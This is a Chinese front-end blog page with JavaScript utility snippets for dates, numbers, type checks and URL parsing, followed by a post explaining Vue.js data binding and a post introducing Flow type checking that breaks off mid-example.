  <div class="article-meta">
    <a href="/2019/07/03/utils/" class="article-date">
  <time class="dt-published" datetime="2019-07-03T06:10:11.000Z" itemprop="datePublished">2019-07-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/utils/">utils</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/07/03/utils/">utils</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h1><h1 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h1><h2 id="时间戳-转-年-月-日-时-分"><a href="#时间戳-转-年-月-日-时-分" class="headerlink" title="时间戳 转 年-月-日 时:分"></a>时间戳 转 年-月-日 时:分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">let YMD = (now)  =&gt; &#123;</span><br><span class="line">    if(now == null) return null;</span><br><span class="line">    now = Number(now);</span><br><span class="line">    var date = new Date(now);</span><br><span class="line">    Y = date.getFullYear();</span><br><span class="line">    M = (date.getMonth() + 1 &lt; 10 ? &#x27;0&#x27; + (date.getMonth() + 1) : date.getMonth() + 1);</span><br><span class="line">    D = date.getDate() &lt; 10 ? &#x27;0&#x27; + (date.getDate()) : date.getDate();</span><br><span class="line">    H = date.getHours() &lt; 10 ? &#x27;0&#x27; +  (date.getHours()): date.getHours() ;</span><br><span class="line">    F = date.getMinutes() &lt; 10 ? &#x27;0&#x27; + (date.getMinutes()) : date.getMinutes();</span><br><span class="line">    return  Y + &#x27;-&#x27; + M + &#x27;-&#x27; + D + &#x27;&#x27; + H + &#x27;:&#x27; + F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="日期-年-月-日-时-分-转成-时间戳"><a href="#日期-年-月-日-时-分-转成-时间戳" class="headerlink" title="日期 年/月/日 时:分 转成 时间戳"></a>日期 年/月/日 时:分 转成 时间戳</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let unix = (args) =&gt; &#123;</span><br><span class="line">    var arr = args.split(&quot; &quot;);</span><br><span class="line">    var time = (new Date(arr)).getTime();</span><br><span class="line">    console.log(time); // 1496909520000  单位:ms</span><br><span class="line">    return time;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="根据时间戳判断不同的时间段显示今天，昨天，前天，具体日期"><a href="#根据时间戳判断不同的时间段显示今天，昨天，前天，具体日期" class="headerlink" title="根据时间戳判断不同的时间段显示今天，昨天，前天，具体日期"></a>根据时间戳判断不同的时间段显示今天，昨天，前天，具体日期</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">let format = (time) =&gt; &#123;</span><br><span class="line">    const oneDay = 24*60*60*1000; // 一天的毫秒数</span><br><span class="line">    var today = new Date();</span><br><span class="line">    var param = new Date(time);</span><br><span class="line">    var d = Math.floor(today.getTime()/oneDay) - Math.floor(time/oneDay);</span><br><span class="line">    if (d == 0) &#123;</span><br><span class="line">        // 今天</span><br><span class="line">        return &#x27;今天&#x27;;</span><br><span class="line">    &#125; else if (d == 1) &#123;</span><br><span class="line">        // 昨天</span><br><span class="line">        return &#x27;昨天&#x27;;</span><br><span class="line">    &#125; else if (d == 2) &#123;</span><br><span class="line">        // 前天</span><br><span class="line">        return &#x27;前天&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 显示具体日期</span><br><span class="line">        if (today.getFullYear() == param.getFullYear()) &#123;</span><br><span class="line">            // 不显示年</span><br><span class="line">            return param.getMonth()+1 + &#x27;-&#x27; + param.getDate();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 显示年</span><br><span class="line">            return param.getFullYear() + &#x27;-&#x27; + (param.getMonth()+1) + &#x27;-&#x27; + param.getDate();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h1><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h1 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h1><h2 id="百分数转换成小数"><a href="#百分数转换成小数" class="headerlink" title="百分数转换成小数"></a>百分数转换成小数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let percentTodecimal = (percent) = &#123;</span><br><span class="line">    var decimal = (String(percent).replace(/%/, &quot;&quot;))/100 ;</span><br><span class="line">    //保留两位</span><br><span class="line">    return decimal.toFixed(2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数字转换成百分数"><a href="#数字转换成百分数" class="headerlink" title="数字转换成百分数"></a>数字转换成百分数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let toPercent = (point) =&gt; &#123;</span><br><span class="line">    var str=Number(point*100).toFixed(1);</span><br><span class="line">    str+=&quot;%&quot;;</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数字加单位"><a href="#数字加单位" class="headerlink" title="数字加单位"></a>数字加单位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 数字转整数 如 100000 转为10万</span><br><span class="line"> * @param &#123;需要转化的数&#125; num</span><br><span class="line"> * @param &#123;需要保留的小数位数&#125; point</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">let browseNumber = (num, point) =&gt; &#123;</span><br><span class="line">    let numStr = num.toString()</span><br><span class="line">    // 万以内直接返回</span><br><span class="line">    if (numStr.length &lt; 5) &#123;</span><br><span class="line">        return numStr;</span><br><span class="line">    &#125;</span><br><span class="line">    //大于8位数是亿</span><br><span class="line">    else if (numStr.length &gt; 8) &#123;</span><br><span class="line">        let decimal = numStr.substring(numStr.length - 8, numStr.length - 8 + parseInt(point));</span><br><span class="line">        return parseFloat(parseInt(num / 100000000) + &#x27;.&#x27; + decimal) + &#x27;亿&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    //大于4位数是万</span><br><span class="line">    else if (numStr.length &gt; 4 &amp;&amp; numStr.length &lt;= 5) &#123;</span><br><span class="line">        let decimal = numStr.substring(numStr.length - 4, numStr.length - 4 + parseInt(point))</span><br><span class="line">        return parseFloat(parseInt(num / 10000) + &#x27;.&#x27; + decimal) + &#x27;万&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    //大于5位数是十万+</span><br><span class="line">    else if (numStr.length &gt; 5) &#123;</span><br><span class="line">        let decimal = numStr.substring(numStr.length - 4, numStr.length - 4 + parseInt(point))</span><br><span class="line">        return parseFloat(parseInt(10)) + &#x27;万+&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h1><h2 id="判断对象的数据类型"><a href="#判断对象的数据类型" class="headerlink" title="判断对象的数据类型"></a>判断对象的数据类型</h2><p>使用 Object.prototype.toString 配合闭包，通过传入不同的判断类型来返回不同的判断函数（注意传入 type 参数时首字母大写）</p>
<blockquote>
<p>不推荐将这个函数用来检测可能会产生包装类型的基本数据类型上,因为 call 会将第一个参数进行装箱操作</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function dataType()&#123;</span><br><span class="line">    // 预置目前已知的数据类型</span><br><span class="line">    var is =&#123;</span><br><span class="line">            types : [ &quot;String&quot;,&quot;Boolean&quot;, &quot;Number&quot;,  &quot;Array&quot;, &quot;Object&quot;, &quot;Date&quot;, &quot;RegExp&quot;,&quot;Window&quot;, &quot;HTMLDocument&quot;]</span><br><span class="line">        &#125;;</span><br><span class="line">    for(var i = 0, c; c = is.types[ i++ ]; )&#123;</span><br><span class="line">        is[c] = (function(type)&#123;</span><br><span class="line">            return function(obj)&#123;</span><br><span class="line">               return Object.prototype.toString.call(obj) == &quot;[object &quot; + type + &quot;]&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)(c);</span><br><span class="line">    &#125;</span><br><span class="line">    // 利用return返回值,提供给外面调用</span><br><span class="line">    return is ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var is = dataType(); </span><br><span class="line">//检测是否是字符串对象</span><br><span class="line">console.log(is.String(&#x27;11&#x27;)); </span><br><span class="line">// true</span><br></pre></td></tr></table></figure>

<p>ES6的写法(推荐)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const isType = type =&gt; target =&gt; &#x27;[object $&#123;type&#125;]&#x27; === Object.prototype.toString.call(target);</span><br><span class="line">const isArray = isType(&#x27;Array&#x27;);</span><br><span class="line">console.log(isArray([]));</span><br><span class="line">&gt; true</span><br></pre></td></tr></table></figure>

<h2 id="检测对象-不仅指Object-是否存在并且检测对象是否为空"><a href="#检测对象-不仅指Object-是否存在并且检测对象是否为空" class="headerlink" title="检测对象(不仅指Object)是否存在并且检测对象是否为空"></a>检测对象(不仅指Object)是否存在并且检测对象是否为空</h2><p><strong>方式一：jq $.isEmptyObject(obj); 空ture 非空false</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function isEmptyObject_1(obj)&#123;</span><br><span class="line">    if (typeof obj === &quot;undefined&quot;) &#123;</span><br><span class="line">        console.log(&quot;该对象不存在&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if($.isEmptyObject(obj)==true)&#123;</span><br><span class="line">            console.log(&quot;空对象&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            console.log(&quot;非空对象&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>方式二：利用JSON.stringify(obj)方法检测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function isEmptyObject_2(obj)&#123;</span><br><span class="line">    if (typeof obj === &quot;undefined&quot;) &#123;</span><br><span class="line">        console.log(&quot;该对象不存在&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(JSON.stringify(obj) == &quot;&#123;&#125;&quot;)&#123;</span><br><span class="line">            console.log(&quot;空对象&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            console.log(&quot;非空对象&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="String"><a href="#String" class="headerlink" title="String"></a>String</h1><h2 id="indexOf查找字符串中是否有某个特殊字符"><a href="#indexOf查找字符串中是否有某个特殊字符" class="headerlink" title="indexOf查找字符串中是否有某个特殊字符"></a>indexOf查找字符串中是否有某个特殊字符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// indexOf的用法: 含有这个字符返回索引位置，没有返回-1</span><br><span class="line">let indexOf = (str,character) =&gt; &#123;</span><br><span class="line">    return str.indexOf(character);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解析url的参数组装成对象返回"><a href="#解析url的参数组装成对象返回" class="headerlink" title="解析url的参数组装成对象返回"></a>解析url的参数组装成对象返回</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let parseQueryString = (url) =&gt; &#123;</span><br><span class="line">    let reg_url = /^[^\?]+\?([\w\W]+)$/,</span><br><span class="line">    reg_para = /([^&amp;=]+)=([\w\W]*?)(&amp;|$|#)/g,</span><br><span class="line">    arr_url = reg_url.exec(url),</span><br><span class="line">    ret = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    if (arr_url &amp;&amp; arr_url[1]) &#123;</span><br><span class="line">        var str_para = arr_url[1], result;</span><br><span class="line">        while ((result = reg_para.exec(str_para)) != null) &#123;</span><br><span class="line">            ret[result[1]] = result[2];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="根据姓氏选取数组中预置的背景颜色"><a href="#根据姓氏选取数组中预置的背景颜色" class="headerlink" title="根据姓氏选取数组中预置的背景颜色"></a>根据姓氏选取数组中预置的背景颜色</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">let getColor = (name) =&gt; &#123;</span><br><span class="line">    var color= [&#x27;#eead10&#x27;,&#x27;#f99a2b&#x27;,&#x27;#f38134&#x27;,&#x27;#6495ed&#x27;,&#x27;#3ab1aa&#x27;,&#x27;#0abfb5&#x27;,&#x27;#06aae1&#x27;,&#x27;#00bfff&#x27;,&#x27;#96bc53&#x27;,&#x27;#00ced1&#x27;,&#x27;#89a8e0&#x27;];</span><br><span class="line">    var newName = encodeURI(name).replace(/%/g, &quot;&quot;);</span><br><span class="line">    var lastName, hexadecimal, tenBinary;</span><br><span class="line">    //长度大于等于6位，取后六位</span><br><span class="line">    if(newName.length &gt;= 6) &#123;</span><br><span class="line">      lastName = newName.substr(0,6);</span><br><span class="line">      hexadecimal = parseInt(lastName,16);</span><br><span class="line">      //能转成数字</span><br><span class="line">      if(hexadecimal) &#123;</span><br><span class="line">        tenBinary = hexadecimal%10;</span><br><span class="line">        return color[tenBinary];</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        //不能转数字</span><br><span class="line">        return color[10];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return color[10]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="表单获取焦点时placeholder的提示语消失，提升用户体验。"><a href="#表单获取焦点时placeholder的提示语消失，提升用户体验。" class="headerlink" title="表单获取焦点时placeholder的提示语消失，提升用户体验。"></a>表单获取焦点时placeholder的提示语消失，提升用户体验。</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">let placeholder = () =&gt; &#123;</span><br><span class="line">    $(document).on(&#x27;focus&#x27;,&#x27;textarea&#x27;,function()&#123;</span><br><span class="line">        $(this).attr(&#x27;placeholder&#x27;,&#x27;&#x27;);</span><br><span class="line">        if(!$.trim(this.value))&#123;</span><br><span class="line">            this.value = &#x27;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).on(&#x27;blur&#x27;,&#x27;textarea&#x27;,function()&#123;</span><br><span class="line">        var salf = this;</span><br><span class="line">        $(salf).attr(&#x27;placeholder&#x27;,&#x27;请输入说明文字&#x27;);</span><br><span class="line">        if(!$.trim(salf.value))&#123;</span><br><span class="line">            this.value = &#x27;&#x27;;</span><br><span class="line">            setTimeout(function()&#123;salf.value = &#x27;&#x27;;&#125;,100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/07/03/utils/" data-id="ckw8thuk6001re4d8ehzi93sg" data-title="utils" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-数据驱动" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/06/28/%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8/" class="article-date">
  <time class="dt-published" datetime="2019-06-28T01:16:22.000Z" itemprop="datePublished">2019-06-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/vue2-x/">vue2.x</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/06/28/%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8/">数据驱动</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="数据驱动"><a href="#数据驱动" class="headerlink" title="数据驱动"></a>数据驱动</h1><p>Vue.js 一个核心思想是数据驱动。所谓数据驱动，是指视图是由数据驱动生成的，我们对视图的修改，不会直接操作 DOM，而是通过修改数据。它相比我们传统的前端开发，如使用 jQuery 等前端库直接修改 DOM，大大简化了代码量。特别是当交互复杂的时候，只关心数据的修改会让代码的逻辑变的非常清晰，因为 DOM 变成了数据的映射，我们所有的逻辑都是对数据的修改，而不用碰触 DOM，这样的代码非常利于维护。</p>
<h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>vue实现数据双向绑定主要是：采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty（）来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应监听回调。当把一个普通 Javascript 对象传给 Vue 实例来作为它的 data 选项时，Vue 将遍历它的属性，用 Object.defineProperty 将它们转为 getter/setter。用户看不到 getter/setter，但是在内部它们让 Vue 追踪依赖，在属性被访问和修改时通知变化。</p>
<p>vue的数据双向绑定 将MVVM作为数据绑定的入口，整合Observer，Compile和Watcher三者，通过Observer来监听自己的model的数据变化，通过Compile来解析编译模板指令（vue中是用来解析模板字符串），最终利用watcher搭起observer和Compile之间的通信桥梁，达到数据变化 —&gt;视图更新；视图交互变化（input）—&gt;数据model变更双向绑定效果。</p>
<h2 id="对getter-setter的理解？"><a href="#对getter-setter的理解？" class="headerlink" title="对getter/setter的理解？"></a>对getter/setter的理解？</h2><p>当打印出Vue实例下的data对象里的属性，它的每个属性都有两个相对应的get和set方法，顾名思义，get为取值，set为赋值，正常情况下，我们取值和赋值是用obj.prop的方式，但是这样做有一个问题，我如何知道对象的值改变了？所以就轮到set登场了。你可以把get和set理解为function，当我们调用对象的属性时，我们会进入到get.属性(){…}中，先判断对象是否有这个属性，如果没有，那麽就添加一个name属性，并给它赋值；如果有name属性，那就返回name属性。你可以把get看成一个取值的函数，函数的返回值就是它拿到的值。感觉比较重要的是set属性，当给实例赋值：此时，会进入set name(val){…}；形参val就是我赋给name属性的值，在这个函数里，就可以做很多事了，比如双向绑定！因为这个值的每次改变都必须经过set，其他方式是改变不了它的，相当于一个万能的监听器。ES5的对象原型有两个新的属性__defineGetter__和__defineSetter__，专门用来给对象绑定get和set。建议使用下面这种方式，因为是在原型上书写，所以可以继承和重用。</p>
<h1 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h1><p>Vue.js的数据驱动就是通过MVVM这种框架来实现的。MVVM框架主要包含3个部分:model、view和 viewmodel。</p>
<p>Model:指的是数据部分，对应到前端相当于javascript对象</p>
<p>View:指的是视图部分，对应前端相当于dom</p>
<p>Viewmodel:就是连接视图与数据的中间件通讯</p>
<p> </p>
<p>数据(Model)和视图(View)是不能直接通讯的，而是需要通过ViewModel来实现双方的通讯。当数据变化的时候，viewModel能够监听到这种变化，并及时的通知view做出修改。同样的，当页面有事件触发时，viewMOdel也能够监听到事件，并通知model进行响应。Viewmodel就相当于一个观察者，监控着双方的动作，并及时通知对方进行相应的操作。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/06/28/%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8/" data-id="ckw8thukl002pe4d8e59jgprv" data-title="数据驱动" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-flow" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/06/27/flow/" class="article-date">
  <time class="dt-published" datetime="2019-06-27T08:55:22.000Z" itemprop="datePublished">2019-06-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/vue2-x/">vue2.x</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/06/27/flow/">Flow</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="认识-Flow"><a href="#认识-Flow" class="headerlink" title="认识 Flow"></a>认识 Flow</h1><blockquote>
<p>Flow 是 facebook 出品的 JavaScript 静态类型检查工具。Vue.js 的源码利用了 Flow 做了静态类型检查，所以了解 Flow 有助于我们阅读源码。</p>
</blockquote>
<h1 id="为什么用-Flow"><a href="#为什么用-Flow" class="headerlink" title="为什么用 Flow"></a>为什么用 Flow</h1><p>JavaScript 是动态类型语言，它的灵活性有目共睹，但是过于灵活的副作用是很容易就写出非常隐蔽的隐患代码，在编译期甚至看上去都不会报错，但在运行阶段就可能出现各种奇怪的 bug。<br>类型检查是当前动态类型语言的发展趋势，所谓类型检查，就是在编译期尽早发现（由类型错误引起的）bug，又不影响代码运行（不需要运行时动态检查类型），使编写 JavaScript 具有和编写 Java 等强类型语言相近的体验。<br>项目越复杂就越需要通过工具的手段来保证项目的维护性和增强代码的可读性。 Vue.js 在做 2.0 重构的时候，在 ES2015 的基础上，除了 ESLint 保证代码风格之外，也引入了 Flow 做静态类型检查。之所以选择 Flow，主要是因为 Babel 和 ESLint 都有对应的 Flow 插件以支持语法，可以完全沿用现有的构建配置，非常小成本的改动就可以拥有静态类型检查的能力。</p>
<h1 id="Flow-的工作方式"><a href="#Flow-的工作方式" class="headerlink" title="Flow 的工作方式"></a>Flow 的工作方式</h1><p>通常类型检查分成 2 种方式：</p>
<ul>
<li>类型推断：通过变量的使用上下文来推断出变量类型，然后根据这些推断来检查类型。</li>
<li>类型注释：事先注释好我们期待的类型，Flow 会基于这些注释来判断。</li>
</ul>
<h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><p>它不需要任何代码修改即可进行类型检查，最小化开发者的工作量。它不会强制你改变开发习惯，因为它会自动推断出变量的类型。这就是所谓的类型推断，Flow 最重要的特性之一。<br>通过一个简单例子说明一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*@flow*/``</span><br><span class="line"></span><br><span class="line">function split(str) &#123;</span><br><span class="line">  return str.split(&#x27; &#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">split(11)</span><br></pre></td></tr></table></figure>

<p>Flow 检查上述代码后会报错，因为函数 split 期待的参数是字符串，而我们输入了数字。</p>
<h2 id="类型注释"><a href="#类型注释" class="headerlink" title="类型注释"></a>类型注释</h2><p>如上所述，类型推断是 Flow 最有用的特性之一，不需要编写类型注释就能获取有用的反馈。但在某些特定的场景下，添加类型注释可以提供更好更明确的检查依据。<br>考虑如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*@flow*/</span><br><span class="line"></span><br><span class="line">function add(x, y)&#123;</span><br><span class="line">  return x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(&#x27;Hello&#x27;, 11)</span><br></pre></td></tr></table></figure>

<p>Flow 检查上述代码时检查不出任何错误，因为从语法层面考虑， + 即可以用在字符串上，也可以用在数字上，我们并没有明确指出 add() 的参数必须为数字。<br>在这种情况下，我们可以借助类型注释来指明期望的类型。类型注释是以冒号 : 开头，可以在函数参数，返回值，变量声明中使用。<br>如果我们在上段代码中添加类型注释，就会变成如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*@flow*/</span><br><span class="line"></span><br><span class="line">function add(x: number, y: number): number &#123;</span><br><span class="line">  return x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(&#x27;Hello&#x27;, 11)</span><br></pre></td></tr></table></figure>

<p>现在 Flow 就能检查出错误，因为函数参数的期待类型为数字，而我们提供了字符串。</p>
<p>上面的例子是针对函数的类型注释。接下来我们来看看 Flow 能支持的一些常见的类型注释。</p>
<blockquote>
<p>数组</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*@flow*/</span><br><span class="line"></span><br><span class="line">var arr: Array&lt;number&gt; = [1, 2, 3]</span><br><span class="line"></span><br><span class="line">arr.push(&#x27;Hello&#x27;)</span><br></pre></td></tr></table></figure>

